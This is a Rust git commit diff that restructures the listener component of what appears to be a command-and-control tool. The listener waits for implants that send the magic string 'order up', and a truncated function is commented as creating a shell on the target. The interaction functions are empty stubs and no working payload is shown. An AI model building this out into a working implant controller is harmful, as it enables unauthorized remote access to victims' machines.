fe6cb43eeef9bda09b5c1689071b23bc85e60d0f
Robster4911 <robbieheine@gmail.com>
2022-10-23 08:39:09 -0400

    Listener Restructuring [-] Did away with use of traits to implement listener functions, since self-referentiability is deemed unsafe in rust. [+] Restructured listener functions to take a listener as an argument rather than being attached to listener structs. 	[+] Modifications made to lsn_run(), listen_tcp(), listen_udp(). [+] Added interact_udp() and interact_tcp() to be completed later.
    Changes author: Robbie Heine

--- src/lib.rs
+++ src/lib.rs
@@ -7,66 +7,59 @@ use std::net::{UdpSocket, SocketAddr, TcpListener};
 //  hostname: String,
 //}
 
-pub struct Listener<'a, T: Listen> {
-    listen: &'a T,
+pub struct Listener {
     udp_sock: UdpSocket,
     tcp_sock: TcpListener,
     id: u64,
+    // 0 for idle, 1 for listening, 2 for connected
     status: u8,
-    port: u64,
 }
 
-pub trait Listen {
-    fn run(&self, protocol: &str, address: SocketAddr);
-    fn listen_udp(&self, address: SocketAddr);
-    fn listen_tcp(&self, address: SocketAddr);
-    // fn parse_tcp();
-    // fn parse_udp();
-    // fn parse_http();
-    // fn parse_dns();
+pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr){
+    match protocol {
+        "udp" => listen_udp(lsn, address),
+        "tcp" => listen_tcp(lsn, address),
+        "http" => listen_tcp(lsn, address),
+        "dns" => listen_udp(lsn, address),
+        &_ => todo!(),
+    }
 }
 
+    // listens using a TcpListener
+pub fn listen_tcp(lsn: &mut Listener, address: SocketAddr){
+    println!("[+] Opening tcp listener on port {}", address.port());
+}
 
-impl<'a, T> Listener<'a, T> 
-where 
-    T: Listen
-{
-    fn run(&mut self, protocol: &str, address: SocketAddr){
-        match protocol {
-            "udp" => self.listen_udp(address),
-            "tcp" => self.listen_tcp(address),
-            "http" => self.listen_tcp(address),
-            "dns" => self.listen_udp(address),
-            &_ => todo!(),
+// listens using a UdpSocket
+pub fn listen_udp(lsn: &mut Listener, address: SocketAddr){
+    lsn.status = 1;
+    lsn.udp_sock = UdpSocket::bind(address).unwrap();
+    println!("[+] Opening udp listener on port {}", address.port());
+    loop { // break loop if connection is made
+        let mut buffer = [0; 2048];
+        let (bytes, src) = lsn.udp_sock.recv_from(&mut buffer).unwrap();
+
+        // replace insides of .contains() with whatever string/key we are using to verify connection
+        if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
+            lsn.status = 2;
+            // call a seperate function which interacts with the target
+            // that way, if the target connection ends, the listener just
+            // automatically goes back to listening
+            // pass src to this function (which contains the implant's IP as a SocketAddr struct)
+            interact_udp(lsn, src);
         }
+        lsn.status = 1;
     }
-
-    fn listen_tcp(&mut self, address: SocketAddr){
-        println!("[+] Opening tcp listener on port {}", self.port);
-    }
-
-    fn listen_udp(&mut self, address: SocketAddr){
-        self.udp_sock = UdpSocket::bind(address).unwrap();
-        println!("[+] Opening udp listener on port {}", address.port());
-        loop { // break loop if connection is made
-            let mut buffer = [0; 2048];
-            let (bytes, src) = self.udp_sock.recv_from(&mut buffer).unwrap();
-
-            // replace insides of .contains() with whatever string/key we are using to verify connection
-            if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
-                // call a seperate function which interacts with the target
-                // that way, if the target connection ends, the listener just
-                // automatically goes back to listening
-                // pass src to this function (which contains the implant's IP as a SocketAddr struct)
-            }
-        }
-    }
-
+    lsn.status = 0;
 }
 
-// pub struct Sender
+fn interact_udp(lsn: &mut Listener, target: SocketAddr) {
+    // TODO
+}
 
-
+fn interact_tcp(lsn: &mut Listener, target: SocketAddr) {
+    // TODO
+}
 
 // creates a shell on the target
 pub fn shell() {
